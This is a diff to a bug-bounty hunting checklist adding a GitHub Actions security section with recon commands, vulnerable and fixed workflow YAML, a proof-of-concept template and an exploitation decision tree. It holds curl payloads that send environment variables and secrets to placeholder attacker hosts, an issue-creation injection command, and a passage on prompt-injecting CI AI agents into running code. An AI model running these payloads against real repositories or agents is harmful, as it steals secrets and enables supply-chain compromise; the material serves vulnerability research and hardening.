@@ -786,12 +786,298 @@ Frontend reads Content-Length: 13 -> sends all. Backend reads Transfer-Encoding 
 - [ ] WebView JavaScript bridge
 - [ ] Mobile API often uses older/different API version than web
 
-## CI/CD Pipeline
-- [ ] GitHub Actions: `pull_request_target` with checkout of PR code
-- [ ] Secrets in workflow logs
-- [ ] Artifact poisoning (overwrite existing artifacts)
-- [ ] Build command injection via branch/tag names
-- [ ] OIDC token theft from CI runners
+## CI/CD Pipeline — GitHub Actions Security
+
+> **Tooling**: Use [sisakulint](https://sisaku-security.github.io/lint/) for automated SAST — 52 rules, taint propagation across steps/jobs/reusable workflows, 81.6% coverage of GitHub Security Advisories (31/38 GHSAs). Install: `brew install sisakulint` or download binary from releases.
+>
+> **Quick scan**: `sisakulint scan .github/workflows/` — flags Critical/High issues with auto-fix suggestions.
+> **Remote scan**: `sisakulint scan --remote owner/repo` — scan without cloning.
+
+### Recon: Finding Workflow Files
+
+```bash
+# Clone target's public repos, then:
+find . -name "*.yml" -path "*/.github/workflows/*" | head -50
+
+# Quick grep for dangerous patterns:
+grep -rn "pull_request_target\|workflow_run" .github/workflows/
+grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
+grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
+grep -rn 'secrets\.\|secrets: inherit' .github/workflows/
+
+# Run sisakulint on all workflows:
+sisakulint scan .github/workflows/
+```
+
+### Category 1: Code Injection & Expression Safety (CICD-SEC-04)
+
+**Root cause**: Untrusted input (`github.event.issue.title`, `github.event.pull_request.body`, branch names, commit messages) interpolated into `run:` blocks via `${{ }}` expressions.
+
+**Taint sources** (attacker-controlled):
+```
+github.event.issue.title / .body
+github.event.pull_request.title / .body / .head.ref
+github.event.comment.body
+github.event.review.body
+github.event.pages.*.page_name
+github.event.commits.*.message / .author.name
+github.event.head_commit.message / .author.name
+github.event.workflow_run.head_branch
+github.head_ref
+```
+
+- [ ] **Expression injection** — `${{ github.event.issue.title }}` in `run:` block = RCE
+  ```yaml
+  # VULNERABLE — attacker creates issue with title: a]]; curl https://evil.com/$(env | base64) #
+  run: echo "${{ github.event.issue.title }}"
+
+  # FIXED — use env var (shell-quoted, not expression-interpolated)
+  env:
+    TITLE: ${{ github.event.issue.title }}
+  run: echo "$TITLE"
+  ```
+- [ ] **Environment variable injection** — untrusted input → `$GITHUB_ENV`
+  ```yaml
+  # VULNERABLE — attacker injects newline + arbitrary VAR=VALUE
+  run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV
+
+  # FIXED — use heredoc delimiter
+  run: |
+    {
+      echo "BRANCH<<EOF"
+      echo "${{ github.head_ref }}"
+      echo "EOF"
+    } >> $GITHUB_ENV
+  ```
+- [ ] **PATH injection** — untrusted input → `$GITHUB_PATH` = arbitrary binary execution
+- [ ] **Output clobbering** — untrusted input → `$GITHUB_OUTPUT` without heredoc delimiter = downstream job manipulation
+- [ ] **Argument injection** — untrusted input as CLI argument (e.g., `docker run ${{ ... }}`)
+  ```yaml
+  # VULNERABLE
+  run: docker run ${{ github.event.pull_request.body }}
+
+  # FIXED — end-of-options marker + env var
+  env:
+    INPUT: ${{ github.event.pull_request.body }}
+  run: docker run -- "$INPUT"
+  ```
+- [ ] **Request forgery (SSRF)** — attacker-controlled URL in `curl`/`wget` within workflow
+
+### Category 2: Pipeline Poisoning & Untrusted Checkout
+
+**Root cause**: Privileged triggers (`pull_request_target`, `workflow_run`) checkout attacker's PR code, which then runs with repository secrets.
+
+- [ ] **Untrusted checkout** — `actions/checkout` on `pull_request_target` without explicit safe ref
+  ```yaml
+  # VULNERABLE — checks out attacker's PR code with repo secrets
+  on: pull_request_target
+  jobs:
+    build:
+      steps:
+        - uses: actions/checkout@v4
+          with:
+            ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
+        - run: make build  # runs attacker's Makefile with secrets
+
+  # FIXED — only checkout base branch, or use read-only permissions
+  permissions: {}
+  steps:
+    - uses: actions/checkout@v4  # checks out base branch by default
+  ```
+- [ ] **TOCTOU (Time-of-Check-Time-of-Use)** — label-gated approval + mutable ref = attacker adds label, pushes malicious commit after approval
+- [ ] **Reusable workflow taint** — `secrets: inherit` passes all secrets to called workflow that processes untrusted input
+- [ ] **Cache poisoning** — untrusted checkout → build → cache write → trusted workflow reads poisoned cache
+- [ ] **Cache poisoning (poisonable step)** — unsafe checkout followed by build step before cache save
+- [ ] **Artifact poisoning** — `actions/download-artifact` from untrusted `workflow_run` without validation
+  ```yaml
+  # VULNERABLE — downloads artifact from untrusted workflow, then executes it
+  on: workflow_run
+  steps:
+    - uses: actions/download-artifact@v4
+    - run: ./downloaded-binary  # attacker-controlled binary
+
+  # FIXED — verify artifact hash/signature before execution
+  ```
+- [ ] **Artipacked** — `actions/checkout` with `persist-credentials: true` (default) leaks `.git/config` credentials in uploaded artifacts
+  ```yaml
+  # FIXED
+  - uses: actions/checkout@v4
+    with:
+      persist-credentials: false
+  ```
+
+### Category 3: Supply Chain & Dependency Security (CICD-SEC-08)
+
+- [ ] **Unpinned actions** — `uses: actions/checkout@v4` (mutable tag) instead of SHA pin
+  ```yaml
+  # VULNERABLE — tag can be force-pushed
+  uses: actions/checkout@v4
+
+  # FIXED — pinned to immutable commit SHA
+  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+  ```
+- [ ] **Impostor commit** — fork network allows pushing commits with SHA that appears to belong to upstream repo
+- [ ] **Ref confusion** — ambiguous tag/branch names exploited to load unintended action version
+- [ ] **Known vulnerable actions** — check actions against GHSA database (sisakulint detects automatically)
+- [ ] **Archived actions** — unmaintained action with unpatched vulnerabilities
+- [ ] **Unpinned container images** — `image: ubuntu:latest` instead of SHA256 digest pin
+
+### Category 4: Credential & Secret Protection
+
+- [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
+- [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials, or hidden files
+  ```yaml
+  # FIXED — exclude hidden files
+  - uses: actions/upload-artifact@v4
+    with:
+      include-hidden-files: false
+  ```
+- [ ] **Unmasked secrets** — `fromJson()` derived values bypass GitHub's automatic masking
+  ```yaml
+  # FIXED — manually mask derived secrets
+  run: |
+    TOKEN=$(echo '${{ secrets.JSON_CREDS }}' | jq -r '.token')
+    echo "::add-mask::$TOKEN"
+  ```
+- [ ] **Excessive `secrets: inherit`** — reusable workflow call inherits all secrets when it only needs one
+- [ ] **Hardcoded credentials** — API keys, passwords, tokens directly in workflow YAML
+
+### Category 5: Triggers & Access Control (CICD-SEC-01)
+
+- [ ] **Dangerous triggers without mitigation** — `pull_request_target` or `workflow_run` with no `permissions: {}`, no approval gate, no ref restriction
+- [ ] **Dangerous triggers with partial mitigation** — some protections present but bypassable
+- [ ] **Label-based approval bypass** — `if: contains(github.event.pull_request.labels.*.name, 'approved')` is spoofable (attacker can add labels)
+- [ ] **Bot condition spoofing** — `if: github.actor != 'dependabot[bot]'` is trivially bypassed by naming account similarly
+- [ ] **Excessive GITHUB_TOKEN permissions** — `permissions: write-all` when only `contents: read` needed
+- [ ] **Self-hosted runners in public repos** — untrusted PRs execute on org infrastructure = container escape → lateral movement
+- [ ] **OIDC token theft** — CI runners expose OIDC tokens that grant cloud access
+
+### Category 6: AI Agent Security (NEW — 2025+)
+
+- [ ] **Unrestricted AI trigger** — `allowed_non_write_users: "*"` lets any user trigger AI agent execution
+- [ ] **Excessive tool grants** — AI agent given Bash/Write/Edit tools in untrusted trigger context = attacker prompt → RCE
+- [ ] **Prompt injection via workflow context** — `${{ github.event.issue.body }}` interpolated into AI agent prompt parameter
+
+### Hunting Workflow
+
+```
+1. Recon: find all .github/workflows/*.yml in target's public repos
+2. Scan: sisakulint scan .github/workflows/ (or --remote owner/repo)
+3. Triage: Critical/High findings → manual verification
+4. For each finding:
+   a. Can I trigger this as an external contributor? (fork PR, issue creation, comment)
+   b. What secrets are accessible? (check permissions: block, secrets usage)
+   c. What's the blast radius? (repo secrets → deploy keys → cloud access)
+5. PoC: create a fork, submit PR/issue that triggers the vulnerable workflow
+6. Prove: show secret exfiltration, code execution, or artifact tampering
+```
+
+### Expression Injection PoC Template
+
+```bash
+# Step 1: Create an issue with injection payload in title
+gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"
+
+# Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
+# CVSS: 9.3 Critical (RCE with repo secrets)
+```
+
+### Real-World GHSAs (Proven Payouts)
+
+| GHSA | Action | Bug Class | Severity |
+|---|---|---|---|
+| GHSA-gq52-6phf-x2r6 | tj-actions/branch-names | Expression injection via branch name | Critical |
+| GHSA-4xqx-pqpj-9fqw | atlassian/gajira-create | Code injection in privileged trigger | Critical |
+| GHSA-g86g-chm8-7r2p | check-spelling/check-spelling | Secret exposure in build logs | Critical |
+| GHSA-cxww-7g56-2vh6 | actions/download-artifact | Artifact poisoning (official action) | High |
+| GHSA-h3qr-39j9-4r5v | gradle/gradle-build-action | Cache poisoning via untrusted checkout | High |
+| GHSA-mrrh-fwg8-r2c3 | tj-actions/changed-files | Supply chain — impostor commit | High |
+| GHSA-phf6-hm3h-x8qp | broadinstitute/cromwell | Token exposure via code injection | Critical |
+| GHSA-qmg3-hpqr-gqvc | reviewdog/action-setup | Time-bomb via tag pinning | High |
+| GHSA-vqf5-2xx6-9wfm | github/codeql-action | Known vulnerable official action | High |
+| GHSA-hw6r-g8gj-2987 | pytorch/pytorch | Argument injection in build workflow | Moderate |
+
+### A→B Signal: CI/CD Chains
+
+```
+Expression injection → secret exfiltration → cloud account takeover
+Untrusted checkout → Makefile RCE → deploy key theft → repo takeover
+Artifact poisoning → release binary tampering → supply chain compromise
+Cache poisoning → build output manipulation → backdoored deployment
+Impostor commit → pinned action hijack → all downstream repos affected
+OIDC token theft → cloud metadata → S3/GCS read → customer data
+Self-hosted runner → container escape → internal network pivot
+```
+
+### Deep-Dive: From sisakulint Finding to Bounty Report
+
+sisakulint findings are **potentially exploitable** — not confirmed bugs. Every finding needs manual verification before reporting. Use this decision tree based on 36 real-world paid reports:
+
+```
+sisakulint finding
+    │
+    ├─ code-injection-* / argument-injection-*
+    │   ├─ Can attacker trigger workflow? (issue, PR, comment from external user)
+    │   ├─ What secrets are accessible? (check env: and secrets: blocks)
+    │   ├─ Is it transitive? (composite action chain — Bazel $13K pattern)
+    │   │   └─ Scan the referenced composite action's action.yml for ${{ inputs.* }}
+    │   └─ Prove: create issue/PR with injection payload → show secret in response
+    │       └─ PoC: gh issue create --title '"; curl https://BURP/$(env|base64) #'
+    │
+    ├─ untrusted-checkout / untrusted-checkout-toctou-*
+    │   ├─ What runs after checkout? (make, npm install, gradle, pip install)
+    │   │   └─ Makefile/package.json/build.gradle = implicit code execution
+    │   ├─ Self-hosted runner? → RoR permanent access (PyTorch $5.5K, GitHub $20K)
+    │   │   └─ Check: runs-on: self-hosted → non-ephemeral → RUNNER_TRACKING_ID=0
+    │   ├─ TOCTOU? → label check + mutable ref → push after approval (Khan pattern)
+    │   └─ Prove: fork → modify build file → submit PR → show secret exfil
+    │
+    ├─ artifact-poisoning-*
+    │   ├─ Is there a workflow_run consumer that downloads this artifact?
+    │   ├─ Does consumer validate artifact source (fork check)?
+    │   │   └─ Check: github.event.workflow_run.head_repository.full_name != github.repository
+    │   └─ Prove: fork PR → upload poisoned artifact → show consumer executes it
+    │       └─ Rust pattern: pull_request → upload → workflow_run → download → deploy
+    │
+    ├─ cache-poisoning / cache-poisoning-poisonable-step
+    │   ├─ Can fork PR write to same cache key? (check hashFiles pattern)
+    │   ├─ Does default branch workflow restore cache with secrets?
+    │   └─ Prove: Cacheract pattern — inject into npm/pip/maven cache
+    │       └─ Wait for push/schedule workflow → show secret exfil from cached payload
+    │
+    ├─ self-hosted-runners
+    │   ├─ Public repo + auto-trigger for outside contributors?
+    │   ├─ Ephemeral or persistent? (--ephemeral flag in config.sh)
+    │   ├─ Docker group membership? → container escape → host root
+    │   └─ Prove: RoR — install runner agent registered to attacker org
+    │       └─ $250K+ total payouts (Khan & Stawinski, DEF CON 32)
+    │
+    ├─ commit-sha / impostor-commit / ref-confusion
+    │   ├─ Is action pinned by mutable tag only? (v1, v2 — not SHA)
+    │   ├─ Can fork push commit with matching SHA prefix?
+    │   └─ Prove: create fork → push impostor commit → show action resolves to attacker code
+    │       └─ tj-actions pattern: 23K repos affected, 218 secret leaks
+    │
+    ├─ ai-action-* (unrestricted-trigger / excessive-tools / prompt-injection)
+    │   ├─ What tools does AI agent have? (Bash/Write/Edit = RCE)
+    │   ├─ Can external user trigger? (allowed_non_write_users: "*")
+    │   ├─ Is user input passed to prompt? (issue body, PR description)
+    │   └─ Prove: create issue with hidden prompt injection → show AI executes payload
+    │       └─ Clinejection: prompt injection → cache poisoning → supply chain
+    │
+    ├─ permissions / secrets-inherit / secret-exposure
+    │   ├─ Overprivileged but reachable from another finding?
+    │   └─ Chain: code-injection + write-all permissions = full repo takeover
+    │
+    └─ artipacked (persist-credentials: true)
+        ├─ Is .git/config uploaded in artifacts?
+        ├─ Download artifact → extract → decode base64 token
+        └─ Prove: ArtiPACKED pattern — GITHUB_TOKEN in artifact, call API with it
+```
+
+**Key references:**
+- [sisaku-security/agent-idea/bugbountyreport](https://github.com/sisaku-security/agent-idea/tree/main/bugbountyreport) — 36 real-world reports with full attack chains
+- [sisakulint docs/advisory](https://sisaku-security.github.io/lint/docs/advisory/) — 38 GHSAs with detection mapping
 
 ## SSTI -- Server-Side Template Injection
 
